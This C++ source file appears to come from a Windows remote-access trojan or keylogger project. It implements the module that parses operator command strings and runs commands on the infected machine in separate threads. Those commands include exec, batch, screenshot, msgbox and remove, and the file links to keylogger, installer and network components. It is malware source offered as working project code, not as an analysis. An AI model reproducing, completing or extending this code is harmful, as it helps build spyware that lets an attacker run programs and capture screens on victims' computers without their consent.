#include "stdafx.h"
#include "CommandExe.h"
#include "Keylogger.h"
#include "Installer.h"
#include "Network.h"
#include "Settings.h"
#include "Util.h"
#include "Command.h"
#include "Command_batch.h"
#include "Command_exec.h"
#include "Command_exit.h"
#include "Command_info.h"
#include "Command_msgbox.h"
#include "Command_remove.h"
#include "Command_screenshot.h"

struct CommandThreadParams
{
	std::vector<std::tstring> args;
};

static Command *CreateCommandFromName(const std::string &name)
{
	if(name == "batch")
		return new Command_batch();
	else if(name == "exec")
		return new Command_exec();
	else if(name == "exit")
		return new Command_exit();
	else if(name == "info")
		return new Command_info();
	else if(name == "msgbox")
		return new Command_msgbox();
	else if(name == "remove")
		return new Command_remove();
	else if(name == "screenshot")
		return new Command_screenshot();
	else
		return NULL;
}

static DWORD WINAPI ExecuteCommand(LPVOID param)
{
	CommandThreadParams *cmdParams = (CommandThreadParams *)param;

	Command *command = CreateCommandFromName(cmdParams->args[0]);
	if(!command)
		return 0;

	bool ret = command->OnExecute(cmdParams->args);

	delete command;
	delete param;
	return ret;
}

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::Run(const std::tstring& cmds)
{
	if (cmds.size() == 0) {
		return;
	}

	std::vector<std::tstring> commands = Util::split(cmds, ';');
	for (auto &cmd : commands) {
		std::vector<std::tstring> args = Util::split(cmd, ' ');
		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::tstring &s) { return std::all_of(s.begin(), s.end(), _istspace); }), args.end());
		if (args.size()) {
			Command *command = CreateCommandFromName(args[0]);
			if(!command)
				continue;

			CommandThreadParams *params = new CommandThreadParams();
			params->args = args;

			CreateThread(NULL, 0, ExecuteCommand, params, 0, NULL);
		}
	}
}